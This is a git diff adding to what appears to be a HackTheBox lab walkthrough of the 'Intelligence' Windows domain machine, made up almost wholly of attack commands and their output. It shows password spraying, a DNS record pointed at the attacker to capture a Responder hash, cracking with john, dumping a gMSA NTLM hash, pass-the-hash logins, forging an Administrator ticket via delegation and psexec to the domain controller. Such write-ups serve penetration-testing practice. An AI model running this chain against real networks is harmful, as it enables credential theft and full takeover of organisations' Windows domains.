@@ -120,3 +120,158 @@ After logging in please change your password as soon as possible.
 ```
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/42ab4edf-6c22-4b70-bf28-d22f54c5d710)
+
+```
+./kerbrute_linux_amd64 passwordspray --dc 10.129.95.154 -d intelligence.htb users-unique.txt 'NewIntelligenceCorpUser9876'
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/76cffb30-94b9-40bf-9055-f699b78b7037)
+
+```
+crackmapexec smb 10.129.95.154 -u users-unique.txt -p 'NewIntelligenceCorpUser9876'
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0a9c597d-4152-470c-aecb-abcf11f25f2e)
+
+```
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
+```
+
+```
+smbmap -H 10.129.95.154 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/291f7fa0-4c88-434f-8571-fc7ef78b1ca7)
+
+```
+smbclient //10.129.95.154/IT/ -U 'Tiffany.Molina'
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2ca3353d-d947-48e0-831c-c5f3f76a70e9)
+
+```
+6c4e5ff4e291d560ff734a6f9e7bc5b2
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/39c2fb6c-3a3a-464d-af9d-693c8c9829e3)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a73c7621-5a87-4936-b243-bad55f38f5c4)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9a5b43dd-b49e-44c5-a46a-4a0e6ac011c1)
+
+```
+sudo bloodhound-python -d intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -ns 10.129.95.154 -c all
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ee303843-c879-41f7-8d01-d218dec1002e)
+
+```
+VBoxManage.exe setextradata "kali-linux-2023.1-virtualbox-amd64" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0e44c0da-80a8-4581-b05c-486624b363a0)
+
+```
+sudo rdate -ncv 10.129.95.154
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9d338625-f684-4f88-8e4d-35e8c05f4598)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c778f4db-3028-4dba-917c-540941754a0e)
+
+```
+wget -c https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py
+```
+
+```
+python dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.129.95.154 -a add -r web1 -d 10.10.16.22 -t A
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d497c34c-fcda-4439-aad0-262f50ab33e5)
+
+```
+pip install kerberos
+```
+
+```
+git clone https://github.com/dirkjanm/krbrelayx.git
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bdaa3570-6983-41c9-97f9-a558bd5761f1)
+
+```
+sudo responder -I tun0 -dwv
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c30b6861-c2b6-4b7e-9b21-ad90481760c3)
+
+```
+Ted.Graves::intelligence:38c7554694db3ffd:DF8EF2EB456ED1CEC419E38E13FECD20:0101000000000000EAD89559AF91DA019D9722E59A910B1B00000000020008004C0042004F00350001001E00570049004E002D00550035004D00410039004A0038004C004A0059003700040014004C0042004F0035002E004C004F00430041004C0003003400570049004E002D00550035004D00410039004A0038004C004A00590037002E004C0042004F0035002E004C004F00430041004C00050014004C0042004F0035002E004C004F00430041004C000800300030000000000000000000000000200000ED48F3D3E47102ABF2BE67D4450C0146946B386D7985BDE79C7D7441B9D8BF500A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a7cc87ab-146b-47e2-a9f6-29b001f00cf4)
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt Ted.Graves.hash
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4dad7fb5-e97e-453e-b6fb-c0ceb5222e5a)
+
+```
+Mr.Teddy         (Ted.Graves)
+```
+
+```
+bloodhound-python -d intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.129.95.154 -c all
+```
+
+```
+crackmapexec ldap 10.129.95.154 -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c2bd2479-1e3b-4d19-8d80-fc1eb36c1f9b)
+
+```
+LDAP        10.129.95.154   636    DC               Account: svc_int$             NTLM: 5ecbb8825fa84b3154a7f12336795ed4
+```
+
+```
+evil-winrm -i 10.129.95.154 -u svc_int$ -H 5ecbb8825fa84b3154a7f12336795ed4
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a26d5dd4-e2cc-4e3d-a5e1-bcec6546f864)
+
+```
+impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes 5ecbb8825fa84b3154a7f12336795ed4:5ecbb8825fa84b3154a7f12336795ed4
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7b3a8269-e22d-430f-8283-2e68efff1004)
+
+Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+
+```
+export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+```
+
+```
+impacket-psexec -k -no-pass administrator@dc.intelligence.htb
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/62b9a035-41f0-4053-8364-55e5c8a457b9)
+
+```
+d74e6f2c83f563dd57e4e9ca8d8abf59
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/3d39b642-7525-450f-98bc-6e030d49910e)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/00dbe5b8-7370-4a61-b721-73244ade6db1)
+
+```
+impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0ade19fc-c253-434e-a631-e53fbc26c6e3)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f52805dc-7b55-4245-af06-be7656dd98a8)
+
